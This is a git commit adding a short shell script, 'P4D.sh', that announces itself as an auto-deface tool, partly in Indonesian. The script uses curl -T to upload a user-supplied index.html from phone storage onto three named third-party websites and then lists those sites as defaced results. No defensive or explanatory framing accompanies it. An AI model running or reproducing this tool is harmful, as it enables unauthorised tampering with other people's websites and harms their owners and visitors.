ecbaa6b27978b05ae5630dfde589c692225acf0d
PrCK27 <51478807+PrCK27@users.noreply.github.com>
2019-06-07 17:32:53 +0700

    Add files via upload

---
+++ P4D.sh
@@ -0,0 +1,18 @@
+echo $yellow"---------------------------------------"
+echo "TOOLS AUTO DEFACE"
+echo $blue"CREATOR : P4TR1CK"
+echo $blue"VERSI   :1.0"
+echo $yellow"---------------------------------------"
+echo NOTE :
+echo   Rename Script Menjadi index.html
+figlet PROSES..
+curl -T /storage/emulated/0/index.html http://scnc.co.za/
+curl -T /storage/emulated/0/index.html http://esfml.com
+curl -T /storage/emulated/0/index.html http://tressor.co.za
+echo DONE MAMANK
+echo HASIL :
+echo - http://scnc.co.za
+echo - http://esfml.com
+echo - http://tressor.co.za
+echo Thanks Telah Menggunakan Tools Sampah ini
+
